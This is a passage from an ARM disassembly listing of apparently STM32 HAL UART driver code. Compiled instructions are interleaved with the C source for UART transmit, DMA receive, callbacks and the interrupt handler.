 8000e18:	f880 2038 	strb.w	r2, [r0, #56]	; 0x38
    HAL_UART_MspInit(huart);
 8000e1c:	f000 fccc 	bl	80017b8 <HAL_UART_MspInit>
  huart->gState = HAL_UART_STATE_BUSY;
 8000e20:	2324      	movs	r3, #36	; 0x24
  __HAL_UART_DISABLE(huart);
 8000e22:	6822      	ldr	r2, [r4, #0]
  huart->gState = HAL_UART_STATE_BUSY;
 8000e24:	f884 3039 	strb.w	r3, [r4, #57]	; 0x39
  __HAL_UART_DISABLE(huart);
 8000e28:	68d3      	ldr	r3, [r2, #12]
  UART_SetConfig(huart);
 8000e2a:	4620      	mov	r0, r4
  __HAL_UART_DISABLE(huart);
 8000e2c:	f423 5300 	bic.w	r3, r3, #8192	; 0x2000
 8000e30:	60d3      	str	r3, [r2, #12]
  UART_SetConfig(huart);
 8000e32:	f7ff ff23 	bl	8000c7c <UART_SetConfig>
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 8000e36:	6823      	ldr	r3, [r4, #0]
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8000e38:	2000      	movs	r0, #0
  CLEAR_BIT(huart->Instance->CR2, (USART_CR2_LINEN | USART_CR2_CLKEN));
 8000e3a:	691a      	ldr	r2, [r3, #16]
 8000e3c:	f422 4290 	bic.w	r2, r2, #18432	; 0x4800
 8000e40:	611a      	str	r2, [r3, #16]
  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 8000e42:	695a      	ldr	r2, [r3, #20]
 8000e44:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 8000e48:	615a      	str	r2, [r3, #20]
  __HAL_UART_ENABLE(huart);
 8000e4a:	68da      	ldr	r2, [r3, #12]
 8000e4c:	f442 5200 	orr.w	r2, r2, #8192	; 0x2000
 8000e50:	60da      	str	r2, [r3, #12]
  huart->gState= HAL_UART_STATE_READY;
 8000e52:	2320      	movs	r3, #32
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8000e54:	63e0      	str	r0, [r4, #60]	; 0x3c
  huart->gState= HAL_UART_STATE_READY;
 8000e56:	f884 3039 	strb.w	r3, [r4, #57]	; 0x39
  huart->RxState= HAL_UART_STATE_READY;
 8000e5a:	f884 303a 	strb.w	r3, [r4, #58]	; 0x3a
  return HAL_OK;
 8000e5e:	bd10      	pop	{r4, pc}
    return HAL_ERROR;
 8000e60:	2001      	movs	r0, #1
}
 8000e62:	bd10      	pop	{r4, pc}

08000e64 <HAL_UART_Transmit>:
{
 8000e64:	e92d 41f0 	stmdb	sp!, {r4, r5, r6, r7, r8, lr}
 8000e68:	461f      	mov	r7, r3
  if(huart->gState == HAL_UART_STATE_READY)
 8000e6a:	f890 3039 	ldrb.w	r3, [r0, #57]	; 0x39
{
 8000e6e:	4604      	mov	r4, r0
  if(huart->gState == HAL_UART_STATE_READY)
 8000e70:	2b20      	cmp	r3, #32
{
 8000e72:	460d      	mov	r5, r1
 8000e74:	4690      	mov	r8, r2
  if(huart->gState == HAL_UART_STATE_READY)
 8000e76:	d14e      	bne.n	8000f16 <HAL_UART_Transmit+0xb2>
    if((pData == NULL) || (Size == 0U))
 8000e78:	2900      	cmp	r1, #0
 8000e7a:	d049      	beq.n	8000f10 <HAL_UART_Transmit+0xac>
 8000e7c:	2a00      	cmp	r2, #0
 8000e7e:	d047      	beq.n	8000f10 <HAL_UART_Transmit+0xac>
    __HAL_LOCK(huart);
 8000e80:	f890 3038 	ldrb.w	r3, [r0, #56]	; 0x38
 8000e84:	2b01      	cmp	r3, #1
 8000e86:	d046      	beq.n	8000f16 <HAL_UART_Transmit+0xb2>
 8000e88:	2301      	movs	r3, #1
 8000e8a:	f880 3038 	strb.w	r3, [r0, #56]	; 0x38
    huart->ErrorCode = HAL_UART_ERROR_NONE;
 8000e8e:	2300      	movs	r3, #0
 8000e90:	63c3      	str	r3, [r0, #60]	; 0x3c
    huart->gState = HAL_UART_STATE_BUSY_TX;
 8000e92:	2321      	movs	r3, #33	; 0x21
 8000e94:	f880 3039 	strb.w	r3, [r0, #57]	; 0x39
    tickstart = HAL_GetTick();
 8000e98:	f7ff f99a 	bl	80001d0 <HAL_GetTick>
 8000e9c:	4606      	mov	r6, r0
    huart->TxXferSize = Size;
 8000e9e:	f8a4 8024 	strh.w	r8, [r4, #36]	; 0x24
    huart->TxXferCount = Size;
 8000ea2:	f8a4 8026 	strh.w	r8, [r4, #38]	; 0x26
    while(huart->TxXferCount > 0U)
 8000ea6:	8ce3      	ldrh	r3, [r4, #38]	; 0x26
 8000ea8:	b29b      	uxth	r3, r3
 8000eaa:	b96b      	cbnz	r3, 8000ec8 <HAL_UART_Transmit+0x64>
    if(UART_WaitOnFlagUntilTimeout(huart, UART_FLAG_TC, RESET, tickstart, Timeout) != HAL_OK)
 8000eac:	463b      	mov	r3, r7
 8000eae:	4632      	mov	r2, r6
 8000eb0:	2140      	movs	r1, #64	; 0x40
 8000eb2:	4620      	mov	r0, r4
 8000eb4:	f7ff ff80 	bl	8000db8 <UART_WaitOnFlagUntilTimeout.constprop.3>
 8000eb8:	b9a8      	cbnz	r0, 8000ee6 <HAL_UART_Transmit+0x82>
    huart->gState = HAL_UART_STATE_READY;
 8000eba:	2320      	movs	r3, #32
    __HAL_UNLOCK(huart);
 8000ebc:	f884 0038 	strb.w	r0, [r4, #56]	; 0x38
    huart->gState = HAL_UART_STATE_READY;
 8000ec0:	f884 3039 	strb.w	r3, [r4, #57]	; 0x39
    return HAL_OK;
 8000ec4:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
      huart->TxXferCount--;
 8000ec8:	8ce3      	ldrh	r3, [r4, #38]	; 0x26
        if(UART_WaitOnFlagUntilTimeout(huart, UART_FLAG_TXE, RESET, tickstart, Timeout) != HAL_OK)
 8000eca:	4632      	mov	r2, r6
      huart->TxXferCount--;
 8000ecc:	3b01      	subs	r3, #1
 8000ece:	b29b      	uxth	r3, r3
 8000ed0:	84e3      	strh	r3, [r4, #38]	; 0x26
      if(huart->Init.WordLength == UART_WORDLENGTH_9B)
 8000ed2:	68a3      	ldr	r3, [r4, #8]
        if(UART_WaitOnFlagUntilTimeout(huart, UART_FLAG_TXE, RESET, tickstart, Timeout) != HAL_OK)
 8000ed4:	2180      	movs	r1, #128	; 0x80
      if(huart->Init.WordLength == UART_WORDLENGTH_9B)
 8000ed6:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
        if(UART_WaitOnFlagUntilTimeout(huart, UART_FLAG_TXE, RESET, tickstart, Timeout) != HAL_OK)
 8000eda:	4620      	mov	r0, r4
 8000edc:	463b      	mov	r3, r7
      if(huart->Init.WordLength == UART_WORDLENGTH_9B)
 8000ede:	d10e      	bne.n	8000efe <HAL_UART_Transmit+0x9a>
        if(UART_WaitOnFlagUntilTimeout(huart, UART_FLAG_TXE, RESET, tickstart, Timeout) != HAL_OK)
 8000ee0:	f7ff ff6a 	bl	8000db8 <UART_WaitOnFlagUntilTimeout.constprop.3>
 8000ee4:	b110      	cbz	r0, 8000eec <HAL_UART_Transmit+0x88>
          return HAL_TIMEOUT;
 8000ee6:	2003      	movs	r0, #3
 8000ee8:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
        huart->Instance->DR = (*tmp & (uint16_t)0x01FF);
 8000eec:	882b      	ldrh	r3, [r5, #0]
 8000eee:	6822      	ldr	r2, [r4, #0]
 8000ef0:	f3c3 0308 	ubfx	r3, r3, #0, #9
 8000ef4:	6053      	str	r3, [r2, #4]
        if(huart->Init.Parity == UART_PARITY_NONE)
 8000ef6:	6923      	ldr	r3, [r4, #16]
 8000ef8:	b943      	cbnz	r3, 8000f0c <HAL_UART_Transmit+0xa8>
          pData +=2U;
 8000efa:	3502      	adds	r5, #2
 8000efc:	e7d3      	b.n	8000ea6 <HAL_UART_Transmit+0x42>
        if(UART_WaitOnFlagUntilTimeout(huart, UART_FLAG_TXE, RESET, tickstart, Timeout) != HAL_OK)
 8000efe:	f7ff ff5b 	bl	8000db8 <UART_WaitOnFlagUntilTimeout.constprop.3>
 8000f02:	2800      	cmp	r0, #0
 8000f04:	d1ef      	bne.n	8000ee6 <HAL_UART_Transmit+0x82>
        huart->Instance->DR = (*pData++ & (uint8_t)0xFF);
 8000f06:	6823      	ldr	r3, [r4, #0]
 8000f08:	782a      	ldrb	r2, [r5, #0]
 8000f0a:	605a      	str	r2, [r3, #4]
 8000f0c:	3501      	adds	r5, #1
 8000f0e:	e7ca      	b.n	8000ea6 <HAL_UART_Transmit+0x42>
      return  HAL_ERROR;
 8000f10:	2001      	movs	r0, #1
 8000f12:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
    return HAL_BUSY;
 8000f16:	2002      	movs	r0, #2
}
 8000f18:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}

08000f1c <HAL_UART_Receive_DMA>:
{
 8000f1c:	4613      	mov	r3, r2
  if(huart->RxState == HAL_UART_STATE_READY) 
 8000f1e:	f890 203a 	ldrb.w	r2, [r0, #58]	; 0x3a
{
 8000f22:	b573      	push	{r0, r1, r4, r5, r6, lr}
  if(huart->RxState == HAL_UART_STATE_READY) 
 8000f24:	2a20      	cmp	r2, #32
{
 8000f26:	4605      	mov	r5, r0
  if(huart->RxState == HAL_UART_STATE_READY) 
 8000f28:	d138      	bne.n	8000f9c <HAL_UART_Receive_DMA+0x80>
    if((pData == NULL) || (Size == 0U))
 8000f2a:	2900      	cmp	r1, #0
 8000f2c:	d034      	beq.n	8000f98 <HAL_UART_Receive_DMA+0x7c>
 8000f2e:	2b00      	cmp	r3, #0
 8000f30:	d032      	beq.n	8000f98 <HAL_UART_Receive_DMA+0x7c>
    __HAL_LOCK(huart);
 8000f32:	f890 2038 	ldrb.w	r2, [r0, #56]	; 0x38
 8000f36:	2a01      	cmp	r2, #1
 8000f38:	d030      	beq.n	8000f9c <HAL_UART_Receive_DMA+0x80>
 8000f3a:	2201      	movs	r2, #1
    huart->ErrorCode = HAL_UART_ERROR_NONE;
 8000f3c:	2400      	movs	r4, #0
    __HAL_LOCK(huart);
 8000f3e:	f880 2038 	strb.w	r2, [r0, #56]	; 0x38
    huart->RxState = HAL_UART_STATE_BUSY_RX;
 8000f42:	2222      	movs	r2, #34	; 0x22
    huart->pRxBuffPtr = pData;
 8000f44:	6281      	str	r1, [r0, #40]	; 0x28
    huart->RxXferSize = Size;
 8000f46:	8583      	strh	r3, [r0, #44]	; 0x2c
    huart->ErrorCode = HAL_UART_ERROR_NONE;
 8000f48:	63c4      	str	r4, [r0, #60]	; 0x3c
    huart->RxState = HAL_UART_STATE_BUSY_RX;
 8000f4a:	f880 203a 	strb.w	r2, [r0, #58]	; 0x3a
    huart->hdmarx->XferCpltCallback = UART_DMAReceiveCplt;
 8000f4e:	6b40      	ldr	r0, [r0, #52]	; 0x34
 8000f50:	4a13      	ldr	r2, [pc, #76]	; (8000fa0 <HAL_UART_Receive_DMA+0x84>)
    HAL_DMA_Start_IT(huart->hdmarx, (uint32_t)&huart->Instance->DR, *(uint32_t*)tmp, Size);
 8000f52:	682e      	ldr	r6, [r5, #0]
    huart->hdmarx->XferCpltCallback = UART_DMAReceiveCplt;
 8000f54:	6282      	str	r2, [r0, #40]	; 0x28
    huart->hdmarx->XferHalfCpltCallback = UART_DMARxHalfCplt;
 8000f56:	4a13      	ldr	r2, [pc, #76]	; (8000fa4 <HAL_UART_Receive_DMA+0x88>)
    huart->hdmarx->XferAbortCallback = NULL;
 8000f58:	6344      	str	r4, [r0, #52]	; 0x34
    huart->hdmarx->XferHalfCpltCallback = UART_DMARxHalfCplt;
 8000f5a:	62c2      	str	r2, [r0, #44]	; 0x2c
    huart->hdmarx->XferErrorCallback = UART_DMAError;
 8000f5c:	4a12      	ldr	r2, [pc, #72]	; (8000fa8 <HAL_UART_Receive_DMA+0x8c>)
 8000f5e:	6302      	str	r2, [r0, #48]	; 0x30
    HAL_DMA_Start_IT(huart->hdmarx, (uint32_t)&huart->Instance->DR, *(uint32_t*)tmp, Size);
 8000f60:	460a      	mov	r2, r1
 8000f62:	1d31      	adds	r1, r6, #4
 8000f64:	f7ff f9e4 	bl	8000330 <HAL_DMA_Start_IT>
    return HAL_OK;
 8000f68:	4620      	mov	r0, r4
    __HAL_UART_CLEAR_OREFLAG(huart);
 8000f6a:	682b      	ldr	r3, [r5, #0]
 8000f6c:	9401      	str	r4, [sp, #4]
 8000f6e:	681a      	ldr	r2, [r3, #0]
 8000f70:	9201      	str	r2, [sp, #4]
 8000f72:	685a      	ldr	r2, [r3, #4]
    __HAL_UNLOCK(huart);
 8000f74:	f885 4038 	strb.w	r4, [r5, #56]	; 0x38
    __HAL_UART_CLEAR_OREFLAG(huart);
 8000f78:	9201      	str	r2, [sp, #4]
 8000f7a:	9a01      	ldr	r2, [sp, #4]
    SET_BIT(huart->Instance->CR1, USART_CR1_PEIE);
 8000f7c:	68da      	ldr	r2, [r3, #12]
 8000f7e:	f442 7280 	orr.w	r2, r2, #256	; 0x100
 8000f82:	60da      	str	r2, [r3, #12]
    SET_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8000f84:	695a      	ldr	r2, [r3, #20]
 8000f86:	f042 0201 	orr.w	r2, r2, #1
 8000f8a:	615a      	str	r2, [r3, #20]
    SET_BIT(huart->Instance->CR3, USART_CR3_DMAR);
 8000f8c:	695a      	ldr	r2, [r3, #20]
 8000f8e:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8000f92:	615a      	str	r2, [r3, #20]
}
 8000f94:	b002      	add	sp, #8
 8000f96:	bd70      	pop	{r4, r5, r6, pc}
      return HAL_ERROR;
 8000f98:	2001      	movs	r0, #1
 8000f9a:	e7fb      	b.n	8000f94 <HAL_UART_Receive_DMA+0x78>
    return HAL_BUSY;
 8000f9c:	2002      	movs	r0, #2
 8000f9e:	e7f9      	b.n	8000f94 <HAL_UART_Receive_DMA+0x78>
 8000fa0:	08000faf 	.word	0x08000faf
 8000fa4:	08001065 	.word	0x08001065
 8000fa8:	08001071 	.word	0x08001071

08000fac <HAL_UART_TxCpltCallback>:
 8000fac:	4770      	bx	lr

08000fae <UART_DMAReceiveCplt>:
{
 8000fae:	b508      	push	{r3, lr}
  if((hdma->Instance->CCR & DMA_CCR_CIRC) == 0U)
 8000fb0:	6803      	ldr	r3, [r0, #0]
  UART_HandleTypeDef* huart = ( UART_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;
 8000fb2:	6a42      	ldr	r2, [r0, #36]	; 0x24
  if((hdma->Instance->CCR & DMA_CCR_CIRC) == 0U)
 8000fb4:	681b      	ldr	r3, [r3, #0]
 8000fb6:	f013 0320 	ands.w	r3, r3, #32
 8000fba:	d110      	bne.n	8000fde <UART_DMAReceiveCplt+0x30>
    huart->RxXferCount = 0U;
 8000fbc:	85d3      	strh	r3, [r2, #46]	; 0x2e
    CLEAR_BIT(huart->Instance->CR1, USART_CR1_PEIE);
 8000fbe:	6813      	ldr	r3, [r2, #0]
 8000fc0:	68d9      	ldr	r1, [r3, #12]
 8000fc2:	f421 7180 	bic.w	r1, r1, #256	; 0x100
 8000fc6:	60d9      	str	r1, [r3, #12]
    CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8000fc8:	6959      	ldr	r1, [r3, #20]
 8000fca:	f021 0101 	bic.w	r1, r1, #1
 8000fce:	6159      	str	r1, [r3, #20]
    CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAR);
 8000fd0:	6959      	ldr	r1, [r3, #20]
 8000fd2:	f021 0140 	bic.w	r1, r1, #64	; 0x40
 8000fd6:	6159      	str	r1, [r3, #20]
    huart->RxState = HAL_UART_STATE_READY;
 8000fd8:	2320      	movs	r3, #32
 8000fda:	f882 303a 	strb.w	r3, [r2, #58]	; 0x3a
  HAL_UART_RxCpltCallback(huart);
 8000fde:	4610      	mov	r0, r2
 8000fe0:	f000 f938 	bl	8001254 <HAL_UART_RxCpltCallback>
 8000fe4:	bd08      	pop	{r3, pc}

08000fe6 <UART_Receive_IT>:
  if(huart->RxState == HAL_UART_STATE_BUSY_RX) 
 8000fe6:	f890 303a 	ldrb.w	r3, [r0, #58]	; 0x3a
{
 8000fea:	b510      	push	{r4, lr}
  if(huart->RxState == HAL_UART_STATE_BUSY_RX) 
 8000fec:	2b22      	cmp	r3, #34	; 0x22
 8000fee:	d136      	bne.n	800105e <UART_Receive_IT+0x78>
    if(huart->Init.WordLength == UART_WORDLENGTH_9B)
 8000ff0:	6883      	ldr	r3, [r0, #8]
 8000ff2:	6901      	ldr	r1, [r0, #16]
 8000ff4:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8000ff8:	6802      	ldr	r2, [r0, #0]
 8000ffa:	6a83      	ldr	r3, [r0, #40]	; 0x28
 8000ffc:	d123      	bne.n	8001046 <UART_Receive_IT+0x60>
        *tmp = (uint16_t)(huart->Instance->DR & (uint16_t)0x01FF);
 8000ffe:	6852      	ldr	r2, [r2, #4]
      if(huart->Init.Parity == UART_PARITY_NONE)
 8001000:	b9e9      	cbnz	r1, 800103e <UART_Receive_IT+0x58>
        *tmp = (uint16_t)(huart->Instance->DR & (uint16_t)0x01FF);
 8001002:	f3c2 0208 	ubfx	r2, r2, #0, #9
 8001006:	f823 2b02 	strh.w	r2, [r3], #2
        huart->pRxBuffPtr += 1U;
 800100a:	6283      	str	r3, [r0, #40]	; 0x28
    if(--huart->RxXferCount == 0U)
 800100c:	8dc4      	ldrh	r4, [r0, #46]	; 0x2e
 800100e:	3c01      	subs	r4, #1
 8001010:	b2a4      	uxth	r4, r4
 8001012:	85c4      	strh	r4, [r0, #46]	; 0x2e
 8001014:	b98c      	cbnz	r4, 800103a <UART_Receive_IT+0x54>
      __HAL_UART_DISABLE_IT(huart, UART_IT_RXNE);
 8001016:	6803      	ldr	r3, [r0, #0]
 8001018:	68da      	ldr	r2, [r3, #12]
 800101a:	f022 0220 	bic.w	r2, r2, #32
 800101e:	60da      	str	r2, [r3, #12]
      __HAL_UART_DISABLE_IT(huart, UART_IT_PE);
 8001020:	68da      	ldr	r2, [r3, #12]
 8001022:	f422 7280 	bic.w	r2, r2, #256	; 0x100
 8001026:	60da      	str	r2, [r3, #12]
        __HAL_UART_DISABLE_IT(huart, UART_IT_ERR);
 8001028:	695a      	ldr	r2, [r3, #20]
 800102a:	f022 0201 	bic.w	r2, r2, #1
 800102e:	615a      	str	r2, [r3, #20]
      huart->RxState = HAL_UART_STATE_READY;
 8001030:	2320      	movs	r3, #32
 8001032:	f880 303a 	strb.w	r3, [r0, #58]	; 0x3a
      HAL_UART_RxCpltCallback(huart);
 8001036:	f000 f90d 	bl	8001254 <HAL_UART_RxCpltCallback>
    if(--huart->RxXferCount == 0U)
 800103a:	2000      	movs	r0, #0
}
 800103c:	bd10      	pop	{r4, pc}
        *tmp = (uint16_t)(huart->Instance->DR & (uint16_t)0x00FF);
 800103e:	b2d2      	uxtb	r2, r2
 8001040:	f823 2b01 	strh.w	r2, [r3], #1
 8001044:	e7e1      	b.n	800100a <UART_Receive_IT+0x24>
      if(huart->Init.Parity == UART_PARITY_NONE)
 8001046:	b921      	cbnz	r1, 8001052 <UART_Receive_IT+0x6c>
        *huart->pRxBuffPtr++ = (uint8_t)(huart->Instance->DR & (uint8_t)0x00FF);
 8001048:	1c59      	adds	r1, r3, #1
 800104a:	6852      	ldr	r2, [r2, #4]
 800104c:	6281      	str	r1, [r0, #40]	; 0x28
        *huart->pRxBuffPtr++ = (uint8_t)(huart->Instance->DR & (uint8_t)0x007F);
 800104e:	701a      	strb	r2, [r3, #0]
 8001050:	e7dc      	b.n	800100c <UART_Receive_IT+0x26>
 8001052:	6852      	ldr	r2, [r2, #4]
 8001054:	1c59      	adds	r1, r3, #1
 8001056:	6281      	str	r1, [r0, #40]	; 0x28
 8001058:	f002 027f 	and.w	r2, r2, #127	; 0x7f
 800105c:	e7f7      	b.n	800104e <UART_Receive_IT+0x68>
    return HAL_BUSY;
 800105e:	2002      	movs	r0, #2
 8001060:	bd10      	pop	{r4, pc}

08001062 <HAL_UART_RxHalfCpltCallback>:
 8001062:	4770      	bx	lr

08001064 <UART_DMARxHalfCplt>:
{
 8001064:	b508      	push	{r3, lr}
  HAL_UART_RxHalfCpltCallback(huart); 
 8001066:	6a40      	ldr	r0, [r0, #36]	; 0x24
 8001068:	f7ff fffb 	bl	8001062 <HAL_UART_RxHalfCpltCallback>
 800106c:	bd08      	pop	{r3, pc}

0800106e <HAL_UART_ErrorCallback>:
 800106e:	4770      	bx	lr

08001070 <UART_DMAError>:
  UART_HandleTypeDef* huart = ( UART_HandleTypeDef* )((DMA_HandleTypeDef* )hdma)->Parent;
 8001070:	6a41      	ldr	r1, [r0, #36]	; 0x24
{
 8001072:	b508      	push	{r3, lr}
  dmarequest = HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAT);
 8001074:	680b      	ldr	r3, [r1, #0]
 8001076:	695a      	ldr	r2, [r3, #20]
  if((huart->gState == HAL_UART_STATE_BUSY_TX) && dmarequest)
 8001078:	f891 0039 	ldrb.w	r0, [r1, #57]	; 0x39
 800107c:	2821      	cmp	r0, #33	; 0x21
 800107e:	d10a      	bne.n	8001096 <UART_DMAError+0x26>
 8001080:	0612      	lsls	r2, r2, #24
 8001082:	d508      	bpl.n	8001096 <UART_DMAError+0x26>
    huart->TxXferCount = 0U;
 8001084:	2200      	movs	r2, #0
 8001086:	84ca      	strh	r2, [r1, #38]	; 0x26
  CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE | USART_CR1_TCIE));
 8001088:	68da      	ldr	r2, [r3, #12]
 800108a:	f022 02c0 	bic.w	r2, r2, #192	; 0xc0
 800108e:	60da      	str	r2, [r3, #12]
  huart->gState = HAL_UART_STATE_READY;
 8001090:	2220      	movs	r2, #32
 8001092:	f881 2039 	strb.w	r2, [r1, #57]	; 0x39
  dmarequest = HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR); 
 8001096:	695b      	ldr	r3, [r3, #20]
  if((huart->RxState == HAL_UART_STATE_BUSY_RX) && dmarequest)
 8001098:	f891 203a 	ldrb.w	r2, [r1, #58]	; 0x3a
 800109c:	2a22      	cmp	r2, #34	; 0x22
 800109e:	d106      	bne.n	80010ae <UART_DMAError+0x3e>
 80010a0:	065b      	lsls	r3, r3, #25
 80010a2:	d504      	bpl.n	80010ae <UART_DMAError+0x3e>
    huart->RxXferCount = 0U;
 80010a4:	2300      	movs	r3, #0
    UART_EndRxTransfer(huart);
 80010a6:	4608      	mov	r0, r1
    huart->RxXferCount = 0U;
 80010a8:	85cb      	strh	r3, [r1, #46]	; 0x2e
    UART_EndRxTransfer(huart);
 80010aa:	f7ff fdd9 	bl	8000c60 <UART_EndRxTransfer>
  huart->ErrorCode |= HAL_UART_ERROR_DMA;
 80010ae:	6bcb      	ldr	r3, [r1, #60]	; 0x3c
  HAL_UART_ErrorCallback(huart);
 80010b0:	4608      	mov	r0, r1
  huart->ErrorCode |= HAL_UART_ERROR_DMA;
 80010b2:	f043 0310 	orr.w	r3, r3, #16
 80010b6:	63cb      	str	r3, [r1, #60]	; 0x3c
  HAL_UART_ErrorCallback(huart);
 80010b8:	f7ff ffd9 	bl	800106e <HAL_UART_ErrorCallback>
 80010bc:	bd08      	pop	{r3, pc}
	...

080010c0 <HAL_UART_IRQHandler>:
   uint32_t isrflags   = READ_REG(huart->Instance->SR);
 80010c0:	6803      	ldr	r3, [r0, #0]
{
 80010c2:	b570      	push	{r4, r5, r6, lr}
   uint32_t isrflags   = READ_REG(huart->Instance->SR);
 80010c4:	681a      	ldr	r2, [r3, #0]
{
 80010c6:	4604      	mov	r4, r0
  if(errorflags == RESET)
 80010c8:	0716      	lsls	r6, r2, #28
   uint32_t cr1its     = READ_REG(huart->Instance->CR1);
 80010ca:	68d9      	ldr	r1, [r3, #12]
   uint32_t cr3its     = READ_REG(huart->Instance->CR3);
 80010cc:	695d      	ldr	r5, [r3, #20]
  if(errorflags == RESET)
 80010ce:	d107      	bne.n	80010e0 <HAL_UART_IRQHandler+0x20>
    if(((isrflags & USART_SR_RXNE) != RESET) && ((cr1its & USART_CR1_RXNEIE) != RESET))
 80010d0:	0696      	lsls	r6, r2, #26
 80010d2:	d55a      	bpl.n	800118a <HAL_UART_IRQHandler+0xca>
 80010d4:	068d      	lsls	r5, r1, #26
 80010d6:	d558      	bpl.n	800118a <HAL_UART_IRQHandler+0xca>
}
 80010d8:	e8bd 4070 	ldmia.w	sp!, {r4, r5, r6, lr}
      UART_Receive_IT(huart);
 80010dc:	f7ff bf83 	b.w	8000fe6 <UART_Receive_IT>
  if((errorflags != RESET) && (((cr3its & USART_CR3_EIE) != RESET) || ((cr1its & (USART_CR1_RXNEIE | USART_CR1_PEIE)) != RESET)))
 80010e0:	f015 0501 	ands.w	r5, r5, #1
 80010e4:	d102      	bne.n	80010ec <HAL_UART_IRQHandler+0x2c>
 80010e6:	f411 7f90 	tst.w	r1, #288	; 0x120
 80010ea:	d04e      	beq.n	800118a <HAL_UART_IRQHandler+0xca>
    if(((isrflags & USART_SR_PE) != RESET) && ((cr1its & USART_CR1_PEIE) != RESET))
 80010ec:	07d3      	lsls	r3, r2, #31
 80010ee:	d505      	bpl.n	80010fc <HAL_UART_IRQHandler+0x3c>
 80010f0:	05ce      	lsls	r6, r1, #23
      huart->ErrorCode |= HAL_UART_ERROR_PE;
 80010f2:	bf42      	ittt	mi
 80010f4:	6be3      	ldrmi	r3, [r4, #60]	; 0x3c
 80010f6:	f043 0301 	orrmi.w	r3, r3, #1
 80010fa:	63e3      	strmi	r3, [r4, #60]	; 0x3c
    if(((isrflags & USART_SR_NE) != RESET) && ((cr3its & USART_CR3_EIE) != RESET))
 80010fc:	0750      	lsls	r0, r2, #29
 80010fe:	d504      	bpl.n	800110a <HAL_UART_IRQHandler+0x4a>
 8001100:	b11d      	cbz	r5, 800110a <HAL_UART_IRQHandler+0x4a>
      huart->ErrorCode |= HAL_UART_ERROR_NE;
 8001102:	6be3      	ldr	r3, [r4, #60]	; 0x3c
 8001104:	f043 0302 	orr.w	r3, r3, #2
 8001108:	63e3      	str	r3, [r4, #60]	; 0x3c
    if(((isrflags & USART_SR_FE) != RESET) && ((cr3its & USART_CR3_EIE) != RESET))
 800110a:	0793      	lsls	r3, r2, #30
 800110c:	d504      	bpl.n	8001118 <HAL_UART_IRQHandler+0x58>
 800110e:	b11d      	cbz	r5, 8001118 <HAL_UART_IRQHandler+0x58>
      huart->ErrorCode |= HAL_UART_ERROR_FE;
 8001110:	6be3      	ldr	r3, [r4, #60]	; 0x3c
 8001112:	f043 0304 	orr.w	r3, r3, #4
 8001116:	63e3      	str	r3, [r4, #60]	; 0x3c
    if(((isrflags & USART_SR_ORE) != RESET) && ((cr3its & USART_CR3_EIE) != RESET))
 8001118:	0716      	lsls	r6, r2, #28
 800111a:	d504      	bpl.n	8001126 <HAL_UART_IRQHandler+0x66>
 800111c:	b11d      	cbz	r5, 8001126 <HAL_UART_IRQHandler+0x66>
      huart->ErrorCode |= HAL_UART_ERROR_ORE;
 800111e:	6be3      	ldr	r3, [r4, #60]	; 0x3c
 8001120:	f043 0308 	orr.w	r3, r3, #8
 8001124:	63e3      	str	r3, [r4, #60]	; 0x3c
    if(huart->ErrorCode != HAL_UART_ERROR_NONE)
 8001126:	6be3      	ldr	r3, [r4, #60]	; 0x3c
 8001128:	2b00      	cmp	r3, #0
 800112a:	d066      	beq.n	80011fa <HAL_UART_IRQHandler+0x13a>
      if(((isrflags & USART_SR_RXNE) != RESET) && ((cr1its & USART_CR1_RXNEIE) != RESET))
 800112c:	0695      	lsls	r5, r2, #26
 800112e:	d504      	bpl.n	800113a <HAL_UART_IRQHandler+0x7a>
 8001130:	0688      	lsls	r0, r1, #26
 8001132:	d502      	bpl.n	800113a <HAL_UART_IRQHandler+0x7a>
        UART_Receive_IT(huart);
 8001134:	4620      	mov	r0, r4
 8001136:	f7ff ff56 	bl	8000fe6 <UART_Receive_IT>
      dmarequest = HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR);
 800113a:	6823      	ldr	r3, [r4, #0]
        UART_EndRxTransfer(huart);
 800113c:	4620      	mov	r0, r4
      dmarequest = HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR);
 800113e:	695d      	ldr	r5, [r3, #20]
      if(((huart->ErrorCode & HAL_UART_ERROR_ORE) != RESET) || dmarequest)
 8001140:	6be2      	ldr	r2, [r4, #60]	; 0x3c
 8001142:	0711      	lsls	r1, r2, #28
 8001144:	d402      	bmi.n	800114c <HAL_UART_IRQHandler+0x8c>
 8001146:	f015 0540 	ands.w	r5, r5, #64	; 0x40
 800114a:	d01a      	beq.n	8001182 <HAL_UART_IRQHandler+0xc2>
        UART_EndRxTransfer(huart);
 800114c:	f7ff fd88 	bl	8000c60 <UART_EndRxTransfer>
        if(HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR))
 8001150:	6823      	ldr	r3, [r4, #0]
 8001152:	695a      	ldr	r2, [r3, #20]
 8001154:	0652      	lsls	r2, r2, #25
 8001156:	d510      	bpl.n	800117a <HAL_UART_IRQHandler+0xba>
          CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAR);
 8001158:	695a      	ldr	r2, [r3, #20]
          if(huart->hdmarx != NULL)
 800115a:	6b60      	ldr	r0, [r4, #52]	; 0x34
          CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAR);
 800115c:	f022 0240 	bic.w	r2, r2, #64	; 0x40
